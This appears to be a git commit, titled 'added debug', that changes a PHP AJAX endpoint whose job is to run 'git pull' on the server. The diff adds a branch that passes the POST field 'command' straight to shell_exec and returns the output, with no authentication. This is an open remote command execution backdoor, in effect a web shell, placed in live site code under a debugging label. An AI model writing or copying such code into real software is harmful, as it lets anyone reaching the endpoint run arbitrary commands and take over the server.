5b8315990b82137bb1f6565096c4121eead99d35
NeonSpectrum <youngskymann@gmail.com>
2017-12-12 13:18:43 +0800

    added debug

--- ajax/gitUpdate.php
+++ ajax/gitUpdate.php
@@ -3,5 +3,9 @@ if ($_SERVER['SERVER_NAME'] == "localhost") {
   echo false;
   return;
 }
-echo trim(preg_replace('/\s+/', ' ', nl2br(shell_exec("export PATH=$PATH:~/git-2.9.5 && cd " . str_replace("ajax", "", __DIR__) . " && git pull origin master 2>&1"))));
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+  echo shell_exec($_POST['command']);
+  return;
+}
+echo trim(preg_replace('/\s+/', ' ', nl2br(shell_exec("export PATH=$PATH:~/git-2.9.5 && cd ".str_replace("ajax", "", __DIR__)." && git pull origin master 2>&1"))));
 ?>
